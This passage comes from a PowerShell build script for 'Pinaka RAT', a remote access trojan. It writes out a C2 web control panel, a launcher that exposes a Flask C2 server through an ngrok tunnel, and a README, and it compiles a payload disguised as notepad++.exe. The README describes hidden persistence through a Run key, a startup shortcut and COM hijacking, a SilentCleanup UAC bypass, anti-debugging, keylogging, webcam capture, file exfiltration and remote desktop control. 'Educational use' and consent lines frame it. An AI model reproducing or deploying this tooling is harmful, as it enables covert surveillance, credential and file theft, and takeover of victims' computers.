    async function updateClients() {
      try {
        const res = await fetch('/get_responses');
        const data = await res.json();
        const select = document.getElementById('clientSelect');
        select.innerHTML = '';

        if (data.clients && data.clients.length > 0) {
          data.clients.forEach(client => {
            const option = document.createElement('option');
            option.value = client;
            option.textContent = client;
            select.appendChild(option);
          });
          selectedClient = data.clients[0];
          select.value = selectedClient;
        } else {
          const opt = document.createElement('option');
          opt.text = 'No Clients';
          opt.disabled = true;
          select.appendChild(opt);
          selectedClient = null;
        }
      } catch (e) {
        console.error("Error fetching clients:", e);
      }
    }

    async function sendCommand(cmd) {
      if (!selectedClient) {
        appendOutput("No client selected");
        return;
      }
      try {
        const res = await fetch('/send_command', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ client: selectedClient, cmd: cmd })
        });
        const result = await res.json();
        appendOutput([+] Command sent: ${cmd} | Status: ${result.status || result.error});
      } catch (err) {
        appendOutput(Error: ${err.message});
      }
    }

    function manualCommand() {
      const cmd = document.getElementById('commandInput').value;
      if (cmd) sendCommand(cmd);
    }

    function appendOutput(msg) {
      const box = document.getElementById('responseBox');
      box.innerHTML += \n${new Date().toLocaleTimeString()} - ${msg};
      box.scrollTop = box.scrollHeight;
    }

    document.getElementById('clientSelect').addEventListener('change', updateClient);
    updateClients();
    setInterval(updateClients, 15000);
  </script>
</body>
</html>
"@
Set-Content -Path "$publicDir\control.html" -Value $indexHtmlContent

# --- Embed and Write start_pinaka.bat ---
Write-Host "Creating start_pinaka.bat"
$startPinakaContent = @"
@echo off
setlocal EnableDelayedExpansion

cd /d C:\Pinaka

echo Preparing Pinaka environment...
if not exist "authtoken.txt" (
    echo Error: authtoken.txt not found. Please create authtoken.txt with your ngrok authtoken from https://dashboard.ngrok.com/get-started/your-authtoken
    echo Example: echo YOUR_NGROK_AUTHTOKEN > authtoken.txt
    pause
    exit /b 1
)

where python >nul 2>&1
if !errorlevel! neq 0 (
    echo Error: Python not found. Please install Python 3.9+ and add it to PATH.
    pause
    exit /b 1
)

echo Starting Flask server...
start cmd /k python "%CD%\c2_server.py"
timeout /t 10

echo Starting ngrok HTTP tunnel...
for /f "tokens=*" %%i in (authtoken.txt) do set "NGROK_TOKEN=%%i"
start cmd /k ngrok http --url=$ngrokDomain 5000 --host-header=rewrite
timeout /t 10

:check_server
for /f "tokens=5" %%i in ('netstat -aon ^| find "0.0.0.0:5000"') do (
    echo Server detected on port 5000. Proceeding...
    goto :check_ngrok
)
echo Waiting for Flask server to start... (Check Flask window for logs)
timeout /t 5
goto :check_server

:check_ngrok
for /f "tokens=2" %%i in ('tasklist ^| find "ngrok.exe"') do (
    echo Ngrok tunnel should be active. Check ngrok console for URL:
    echo - Control: https://$ngrokDomain/control
    echo - C2: wss://$ngrokDomain/c2
    echo Deploy notepad++.exe on target systems with consent.
    goto :end
)
echo Waiting for ngrok tunnel to start...
timeout /t 5
goto :check_ngrok

:end
attrib +h "%CD%\start_pinaka.bat"
pause
exit /b 0
"@
Set-Content -Path "$workDir\start_pinaka.bat" -Value $startPinakaContent

# --- Embed and Write README.txt ---
Write-Host "Creating README.txt"
$readme = @"
# Pinaka RAT - Educational Use Only
## Legal Disclaimer
This code is provided for educational purposes only. Unauthorized use on systems without explicit consent is illegal and unethical. Use this software only in controlled, consensual environments (e.g., virtual machines or authorized test labs).

## Ethical Guidelines
1. Obtain written consent from system owners before deployment.
2. Use in isolated, non-production environments to avoid unintended consequences.
3. Document all testing activities and share findings responsibly.

## Consent Form Template
- System Owner: ___________________________
- Date: ___________________________
- Purpose: ___________________________
- Consent: [ ] Yes  [ ] No
- Signature: ___________________________

## Manual Setup Instructions
1. Install Python 3.10+ manually from https://www.python.org/downloads/ and add to PATH (3.13.1 is compatible).
2. Install Notepad++ version 8.7.9 from https://notepad-plus-plus.org/downloads/ to C:\Program Files\Notepad++ for metadata mimicry (optional).
3. Install required packages manually: pip install requests cryptography opencv-python Pillow psutil numpy websocket-client flask flask-sock pywin32 pyinstaller pynput pyautogui.
4. Install OpenSSL manually via Chocolatey (choco install openssl) or download from https://slproweb.com/products/Win32OpenSSL.html (optional).
5. Install Windows SDK manually from https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/ for mt.exe (metadata editing, optional).
6. Install rcedit via pip install rcedit for EXE metadata modification (optional).
7. (Optional) Place notepad.ico in C:\Pinaka for custom EXE icon. Download from https://iconarchive.com or create one using tools like GIMP or Inkscape.
8. Configure firewall rules manually to allow port 5000 (e.g., netsh advfirewall firewall add rule name="PinakaPort5000" dir=in action=allow protocol=TCP localport=5000).
9. Clean up previous builds manually by deleting dist, build, and .spec files from C:\Pinaka.
10. Install and run ngrok manually: Download from https://ngrok.com/download, extract to C:\Pinaka, and run ngrok authtoken <your_authtoken> followed by ngrok http 5000 --host-header=rewrite.
11. Test C2 connectivity manually by accessing https://$ngrokDomain/control.
12. Build with: powershell -ExecutionPolicy Bypass -File pinaka_build.ps1 (run as non-Administrator unless required).
13. Deploy notepad++.exe on target systems with consent.
14. Run start_pinaka.bat (as Administrator) to launch the server. Access the landing page at https://$ngrokDomain/ and control interface at https://$ngrokDomain/control.

## ngrok Setup
- Download ngrok from https://ngrok.com/download and extract to C:\Pinaka.
- Run ngrok authtoken <your_authtoken> with your token from ngrok.com.
- Start ngrok tunnel manually:
  - HTTP/WebSocket: ngrok http 5000 --host-header=rewrite
- Confirm ngrok domain: $ngrokDomain

## EXE Payload Setup
- The payload is notepad++.exe, a self-contained dropper mimicking Notepad++.
- To use:
  1. Run notepad++.exe on the target system (requires consent and admin privileges).
  2. It launches silently, sets up persistence, and runs the embedded RAT logic.
  3. Connects to C2 immediately without external downloads.
- Files are handled in %APPDATA%\PinakaRAT (hidden).
- Logs are written to %TEMP%\pinaka.log and %TEMP%\pinaka_early.log for debugging (hidden from user).

## Stealthy Execution
- The dropper embeds combined_pinaka.py using base64 and executes it in memory by default.
- No external downloads are required.
- Uses a system-like icon (if notepad.ico is provided) and no console window for stealth.
- Persistence via startup shortcut (winupdate.lnk), registry Run key, and COM hijacking (disabled during debugging).
- UAC bypass using SilentCleanup.exe.
- Anti-debugging and code mutation for evasion.

## Control Interface
- Access at https://$ngrokDomain/control.
- Select a client from the dropdown.
- Click buttons to send commands:
  - Screenshot: Capture screen.
  - Cmd: Run shell commands (e.g., enter 'dir' in Command input).
  - PowerShell: Run PowerShell commands (e.g., enter 'Get-Process').
  - Exfil: Download files (e.g., enter 'secret.txt' in File input).
  - Webcam: Capture webcam image.
  - Start/Stop Keylog: Record keystrokes.
  - Start/Stop Screen: Continuous screenshots.
  - Sysinfo: System stats.
  - Start/Stop HVNC: Remote desktop simulation.
  - Clipboard: Capture clipboard content.
  - Exit: Stop client.
  - Destruct: Delete client files.

## Debugging Notes
- Check %TEMP%\pinaka_early.log for boot-time errors and %TEMP%\pinaka.log for runtime logs.
- Run pinaka_build.ps1 as non-Administrator unless file permissions require elevation.
- Current debug mode skips UAC bypass, anti-debugging, and persistence to isolate issues.
- If connection issues occur, verify ngrok tunnel is active and C2 server is running on port 5000.
- Ensure websocket-client is installed before building: pip install websocket-client.
- Clean up persistence manually if needed:
  - Delete %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.lnk
  - Remove HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NotepadPlusPlus
  - Check HKCU\Software\Classes\CLSID for custom CLSIDs

## Limitations
- May fail on systems without Notepad++ installed or with strict EDRs.
- ngrok free tier limits (40 connections/minute, 8-hour sessions) may disrupt testing.
- Advanced EDRs may detect Python EXEs, UAC bypass, or memory execution.
- Requires admin rights for UAC bypass and registry persistence.
- HVNC is a basic simulation; full VNC requires additional libraries.

## GodRAT Enhancements
- Persistence via Windows registry Run key, Startup Folder, and COM hijacking (disabled during debugging).
- Stealth with hidden folders, Notepad++ mimicry, anti-debugging, and code mutation.
- Evasion with VM checks, random sleeps, and junk code.
- UAC bypass via SilentCleanup for privilege escalation.
- WebSocket-based C2 communication on port 5000 (wss://$ngrokDomain/c2).
- Advanced control interface with keylogging, exfiltration, and HVNC.
"@
Set-Content -Path "$workDir\README.txt" -Value $readme

# --- Copy secret.key to public ---
Copy-Item -Path "secret.key" -Destination "$publicDir\secret.key" -Force

# --- Clean up unwanted files (before compilation) ---
if (Test-Path "dropper_macro.py") {
    Remove-Item -Path "dropper_macro.py" -Force
    Write-Host "Removed old dropper_macro.py"
}

# --- Compile notepad++.pyw to notepad++.exe with PyInstaller ---
Write-Host "Checking pyinstaller and compiling notepad++.pyw to notepad++.exe"
if (-not (Get-Command pyinstaller -ErrorAction SilentlyContinue)) {
    Write-Host "Installing pyinstaller..."
    & pip install pyinstaller
}
$pyinstallerArgs = @(
    "--noconfirm",
    "--onefile",
    "--clean",
    "--noconsole",
    "--hidden-import=win32com",
    "--hidden-import=win32com.client",
    "--hidden-import=winreg",
    "--hidden-import=win32api",
    "--hidden-import=win32con",
    "--hidden-import=win32process",
    "--hidden-import=win32security",
    "--hidden-import=win32clipboard",
    "--hidden-import=cryptography",
    "--hidden-import=cryptography.fernet",
    "--hidden-import=psutil",
    "--hidden-import=cv2",
    "--hidden-import=PIL",
    "--hidden-import=PIL.ImageGrab",
    "--hidden-import=numpy",
    "--hidden-import=requests",
    "--hidden-import=websocket",
    "--hidden-import=websocket-client",
    "--hidden-import=websocket._core",
    "--hidden-import=pynput",
    "--hidden-import=pynput.keyboard",
    "--hidden-import=subprocess",
    "--hidden-import=pywin32",
    "--hidden-import=opencv-python",
    "--hidden-import=pyautogui",
    "--add-data", "C:\\Python313\\Lib\\site-packages\\pywin32_system32;pywin32_system32",
    "--add-data", "C:\\Python313\\Lib\\site-packages\\cv2;cv2",
    "--name", "notepad++",
    "--uac-admin",
    "notepad++.pyw"
)
if (Test-Path "notepad.ico") {
    Write-Host "Found notepad.ico, including custom icon in build"
    $pyinstallerArgs += "--icon=notepad.ico"
} else {
    Write-Host "notepad.ico not found, building without custom icon"
}
& pyinstaller $pyinstallerArgs
if ($LASTEXITCODE -eq 0) {
    Move-Item -Path "$workDir\dist\notepad++.exe" -Destination "$workDir\notepad++.exe" -Force
    Write-Host "Dropper saved as $workDir\notepad++.exe"
    Remove-Item -Path "combined_pinaka.py", "notepad++.pyw" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$workDir\dist", "$workDir\build", "*.spec" -Recurse -Force -ErrorAction SilentlyContinue
} else {
    Write-Host "Error: pyinstaller failed. Check Python, pyinstaller, and permissions. Exit code: $LASTEXITCODE"
    exit 1
}

# --- Build Process ---
Write-Host "Building process completed. Manual steps remain as per README.txt."
Write-Host "Deploy notepad++.exe on target systems with consent and access the control interface at https://$ngrokDomain/control."